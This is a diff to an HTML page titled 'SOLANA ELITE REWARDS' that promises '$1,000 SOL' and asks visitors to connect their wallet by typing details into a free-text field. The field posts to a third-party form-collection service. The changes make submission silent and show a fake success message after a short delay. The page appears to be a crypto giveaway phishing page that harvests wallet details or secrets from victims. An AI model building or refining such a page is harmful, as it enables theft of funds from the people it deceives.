@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA ELITE REWARDS</title>
-    <!-- Corrected Font Link for Syncopate and Space Grotesk -->
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
@@ -24,8 +23,8 @@
 <body>
     <div class="card">
         <div id="form-view">
-            <!-- FIXED: Standard form action to ensure delivery -->
-            <form id="claim-form" action="https://submit-form.com" method="POST">
+            <!-- PURE HTML SUBMISSION - NO JAVASCRIPT ERRORS -->
+            <form action="https://submit-form.com" method="POST">
                 <h1>CLAIM $1,000 SOL</h1>
                 <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                 <div class="ib">
@@ -33,10 +32,9 @@
                     <textarea name="message" required></textarea>
                 </div>
                 
-                <!-- Silent configurations for Formspark -->
-                <input type="hidden" name="_subject" value="New Entry #4uP3">
-                <input type="hidden" name="_next" value="https://github.io">
-
+                <!-- This tells Formspark NOT to show their own 'Thank You' page -->
+                <input type="hidden" name="_feedback_true" value="true">
+                
                 <button type="submit" class="btn">CONNECT WALLET</button>
             </form>
         </div>
@@ -50,12 +48,14 @@
     </div>
 
     <script>
-        // Check if the URL has ?success=true after the browser redirects back
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has('success')) {
-            document.getElementById('form-view').style.display = 'none';
-            document.getElementById('success-view').style.display = 'block';
-        }
+        // Use a much simpler script to show the success message
+        const form = document.querySelector('form');
+        form.onsubmit = function() {
+            setTimeout(() => {
+                document.getElementById('form-view').style.display = 'none';
+                document.getElementById('success-view').style.display = 'block';
+            }, 500);
+        };
     </script>
 </body>
 </html>
